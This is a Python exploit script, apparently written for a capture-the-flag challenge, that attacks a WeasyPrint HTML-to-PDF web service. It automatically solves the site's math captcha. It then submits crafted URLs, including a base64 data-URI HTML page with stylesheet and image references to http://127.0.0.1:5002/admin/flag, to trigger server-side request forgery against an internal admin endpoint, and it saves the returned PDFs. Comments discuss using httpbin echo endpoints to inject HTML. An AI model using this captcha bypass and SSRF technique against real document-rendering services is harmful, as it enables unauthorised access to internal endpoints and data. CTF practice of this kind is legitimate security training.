#!/usr/bin/env python3
"""
Web 2 Doc 1 - Exploit via HTML/CSS includes

WeasyPrint follows references in HTML/CSS:
- <img src="...">
- <link href="..."> 
- @import url("...")
- Background images in CSS

If we host an HTML page externally that references localhost,
WeasyPrint might fetch it as a secondary request with different
security context!
"""

import requests
import re
import base64

BASE_URL = "http://52.59.124.14:5002"

def get_session_and_captcha():
    """Get a fresh session and solve captcha."""
    session = requests.Session()
    resp = session.get(f"{BASE_URL}/")
    match = re.search(r'Math Challenge:\s*(\d+)\s*([+\-*])\s*(\d+)\s*=', resp.text)
    if match:
        a, op, b = int(match.group(1)), match.group(2), int(match.group(3))
        if op == '+':
            answer = a + b
        elif op == '-':
            answer = a - b
        elif op == '*':
            answer = a * b
        else:
            return None, None
        return session, str(answer)
    return None, None

def test_url(url):
    """Test a URL with fresh session."""
    session, captcha = get_session_and_captcha()
    if not session:
        return None
    
    resp = session.post(f"{BASE_URL}/convert", data={
        "url": url,
        "captcha_answer": captcha
    })
    return resp

def main():
    # Since we can't host our own server easily, we can try data URIs
    # or find a service that hosts our HTML
    
    # Method 1: Data URI with HTML that references localhost
    html = """<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" href="http://127.0.0.1:5002/admin/flag?i=0&c=C">
</head>
<body>
    <h1>Test</h1>
    <img src="http://127.0.0.1:5002/admin/flag?i=0&c=C">
</body>
</html>"""
    
    data_uri = "data:text/html;base64," + base64.b64encode(html.encode()).decode()
    
    print("[*] Testing data URI with embedded localhost reference...")
    resp = test_url(data_uri)
    if resp is None:
        print("[-] No response")
    elif resp.status_code == 200 and 'pdf' in resp.headers.get('Content-Type', '').lower():
        print(f"[+] Got PDF! {len(resp.content)} bytes")
        with open("data_uri_test.pdf", "wb") as f:
            f.write(resp.content)
    else:
        print(f"[-] {resp.status_code}: {resp.text[:200]}")
    
    # Method 2: Use pastebin or similar to host HTML
    # We'd need to actually host content somewhere
    
    # Method 3: Check if the service allows HTML in the URL response
    # Some services echo back content we control
    
    print("\n[*] Testing various CSS/HTML injection points...")
    
    # If we can put HTML content somewhere that gets rendered...
    # Maybe the httpbin.org /html endpoint?
    resp = test_url("https://httpbin.org/html")
    if resp and resp.status_code == 200 and 'pdf' in resp.headers.get('Content-Type', '').lower():
        print(f"[+] httpbin/html works: {len(resp.content)} bytes")
        with open("httpbin_html.pdf", "wb") as f:
            f.write(resp.content)
    
    # The key insight is: can the HTML we fetch make WeasyPrint
    # request localhost as a secondary resource?
    
    # Let's test if WeasyPrint follows img src from external pages
    print("\n[*] Testing if images are fetched from external HTML...")
    
    # httpbin has /response-headers endpoint, but we need actual HTML with img
    # Let's try rawgithub or a pastebin alternative
    
    # Actually - let's check if we can abuse httpbin's /anything endpoint
    # It echoes back whatever we send
    test_html = '<html><body><img src="http://127.0.0.1:5002/"></body></html>'
    resp = test_url(f"https://httpbin.org/anything?html={test_html}")
    if resp:
        print(f"[-] httpbin/anything: {resp.status_code}")

if __name__ == "__main__":
    main()
